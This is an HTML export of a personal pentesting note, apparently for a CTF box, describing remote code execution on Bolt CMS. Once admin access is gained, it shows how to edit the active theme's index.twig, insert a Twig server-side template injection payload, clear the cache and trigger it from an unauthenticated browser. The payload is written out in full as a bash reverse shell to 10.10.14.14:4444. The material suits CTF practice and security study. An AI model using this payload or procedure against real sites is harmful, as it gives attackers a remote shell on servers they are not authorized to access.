<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Bolt</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Bolt</h1><br/><p><h1>Admin Access</h1></p><p>[CTF B 137]</p><p></p><p>See <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/bolt-cms">Hacktricks</a></p><p></p><p><h2>Login Page</h2></p><p>By default, you can sign into Bolt CMS at <strong>/bolt</strong></p><p></p><p><h2>RCE</h2></p><p><h3>Identify Theme in Use</h3></p><p><strong>Configuration </strong>→ <strong> View Configuration </strong>→<strong> Main Configuration</strong></p><p></p><p>Look for value of Theme. For example <strong>theme:base-2021</strong>. In this case, you&#39;ll inject an SSTI payload into the <strong>base-2021</strong> config file.</p><p></p><p><h3>Modify Theme</h3></p><p>I placed my payload under <strong>{% block main %}</strong>, but placement may / may not matter.</p><p></p><p><strong>File management</strong> → <strong>View &amp; edit templates</strong> ↓ base-2021 ↓ <strong>index.twig</strong></p><p></p><p><span class="subheading">Payload</span>: You&#39;ll use a <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php">Twig SSTI</a> payload. If the reverse shell doesn&#39;t work try other SSTI payloads. May help to use <strong>phpinfo()</strong> to identify things like blocked functions (if there are any).</p><p></p><p><em>{{[&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.14/4444 0&gt;&amp;1&quot;&#39;]|filter(&#39;system&#39;)}}</em></p><p></p><p>Click <strong>Save Changes</strong>.</p><p></p><p><h3>Clear the Cache</h3></p><p>After injecting your payload, you need to clear the cache so the changes will take effect.</p><p></p><p><strong>Maintenance</strong> → <strong>Clear the cache</strong></p><p></p><p><h3>Trigger</h3></p><p>Using an unauthenticated user (e.g. open a window in Incognito Mode), visit the homepage. When it loads the payload should trigger.</p></div>
</body>
</html>
